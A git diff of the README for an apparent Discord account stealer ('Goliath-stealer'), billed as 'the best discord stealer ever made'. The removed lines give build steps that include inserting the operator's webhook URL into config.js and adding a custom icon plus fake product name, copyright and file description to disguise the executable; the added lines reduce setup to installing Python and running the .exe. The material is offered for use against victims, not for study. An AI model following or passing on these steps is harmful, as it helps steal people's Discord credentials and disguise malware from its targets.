@@ -3,23 +3,9 @@ This is the best discord stealer ever made
 
 📁 〢 Setting Up
 
-Install Node.js IMPORTANT: Install NodeJS version 18.15.0
+Install latest python version
 
-VERY IMPORTANT: When installing Node.js also install "Tools for Native Modules" => Tick Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.
-
-To avoid any circumstances. Please also install the latest version of Visual Studio including the "Desktop development with C++" workload.".
-
-Note: When installing Visual Studio with the "Desktop development with C++" workload make sure to also install MSVC v141 - VS 2017 C++ x64/x86 build  tools
-
-Then run the install.bat file to install all necessary packages
-
-If you are getting errors: Try running the fix.bat file to automatically fix common issues.
-
-Replace Replace_This with your webhook url in config.js
-
-Replace the "default.ico" file with the icon you would like to have on your executable. The filetype must be ".ico"! and the icon should be 256x256 OR 128x128 but 256x256 is the best right now
-
-Lastly add a File Description, ProductName, LegalCopyright & OriginalFilename in config.js
+Execute the Goliath-stealer.exe and you are ready
 
 ⚔Features
 
